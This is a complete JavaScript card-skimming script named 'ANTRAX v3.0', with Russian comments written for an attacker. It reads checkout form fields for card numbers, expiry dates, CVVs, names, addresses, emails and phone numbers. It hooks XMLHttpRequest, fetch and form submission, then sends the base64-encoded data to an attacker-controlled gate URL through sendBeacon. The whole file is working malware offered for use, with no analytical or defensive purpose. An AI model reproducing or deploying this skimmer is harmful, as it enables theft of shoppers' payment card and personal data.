// ANTRAX v3.0 - Event-Driven Universal Skimmer
(function() {
    'use strict';

    const GATE_URL = 'https://your-anonymous-gate.com/gate.php'; // Твой гейт. НЕ НА СЕРВЕРЕ ЖЕРТВЫ.
    let collectedData = {
        cc_number: null,
        cc_exp: null,
        cc_cvv: null,
        full_name: '',
        address: '',
        zip: '',
        city: '',
        country: '',
        email: '',
        phone: '',
        url: window.location.href,
        timestamp: new Date().toISOString()
    };

    // Функция для поиска и извлечения данных из полей
    function extractData() {
        const inputs = document.querySelectorAll('input, select');
        const patterns = {
            cc_number: /^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})$/,
            cc_exp: /^(0[1-9]|1[0-2])\s?\/\s?([0-9]{4}|[0-9]{2})$/,
            cc_cvv: /^[0-9]{3,4}$/,
            email: /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/
        };

        inputs.forEach(input => {
            let value = input.value.replace(/\s+/g, '');
            if (patterns.cc_number.test(value)) collectedData.cc_number = value;
            if (patterns.cc_exp.test(input.value)) collectedData.cc_exp = input.value;
            if (input.name.toLowerCase().includes('cvv') || input.name.toLowerCase().includes('csc') || input.id.toLowerCase().includes('cvv')) {
                 if (patterns.cc_cvv.test(value)) collectedData.cc_cvv = value;
            }
            if (input.name.toLowerCase().includes('name') && !collectedData.full_name) collectedData.full_name = input.value;
            if (input.name.toLowerCase().includes('address')) collectedData.address = input.value;
            if (input.name.toLowerCase().includes('zip') || input.name.toLowerCase().includes('postal')) collectedData.zip = input.value;
            if (input.name.toLowerCase().includes('city')) collectedData.city = input.value;
            if (input.name.toLowerCase().includes('country')) collectedData.country = input.value;
            if (patterns.email.test(input.value)) collectedData.email = input.value;
            if (input.type === 'tel') collectedData.phone = input.value;
        });
    }

    // Функция отправки данных на гейт
    function sendHarvest() {
        // Проверяем, что основные данные собраны
        if (collectedData.cc_number && collectedData.cc_exp && collectedData.cc_cvv) {
            const data = btoa(JSON.stringify(collectedData));
            // Используем navigator.sendBeacon для надежной отправки, даже если страница закрывается
            navigator.sendBeacon(GATE_URL + '?d=' + data);
            // Или классический POST
            /*
            const xhr = new XMLHttpRequest();
            xhr.open('POST', GATE_URL, true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.send('d=' + data);
            */
        }
    }

    // Перехватчик XMLHttpRequest
    const originalSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function(body) {
        if (body) {
            extractData();
            sendHarvest();
        }
        return originalSend.apply(this, arguments);
    };

    // Перехватчик Fetch API
    const originalFetch = window.fetch;
    window.fetch = function() {
        extractData();
        sendHarvest();
        return originalFetch.apply(this, arguments);
    };
    
    // Также вешаем слушатели на кнопки отправки форм для подстраховки
    document.addEventListener('submit', function(e) {
        extractData();
        sendHarvest();
    }, true);

})();